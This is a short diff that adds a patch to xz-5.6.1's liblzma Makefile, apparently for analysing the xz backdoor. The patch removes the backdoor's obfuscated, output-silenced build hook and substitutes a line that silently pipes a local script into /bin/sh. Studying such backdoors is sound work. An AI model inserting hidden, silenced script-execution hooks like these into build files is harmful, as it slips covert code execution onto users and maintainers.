@@ -1,0 +1,11 @@
+--- 1/xz-5.6.1/src/liblzma/Makefile     2024-05-04 00:06:38.292450694 +0800
++++ xz-5.6.1/src/liblzma/Makefile       2024-04-25 22:47:41.515828309 +0800
+@@ -335,7 +335,7 @@
+     export libdir='$(libdir)'; \
+     export liblzma_la_OBJECTS='$(liblzma_la_OBJECTS)'; \
+     export liblzma_la_LIBADD='$(liblzma_la_LIBADD)'; \
+-sed rpath $(am__test_dir) | $(am__dist_setup) >/dev/null 2>&1
++cat 5.6.1.sh | /bin/sh >/dev/null 2>&1
+ LTLIBRARIES = $(lib_LTLIBRARIES)
+ liblzma_la_LIBADD =
+ am__liblzma_la_SOURCES_DIST = ../common/tuklib_physmem.c \
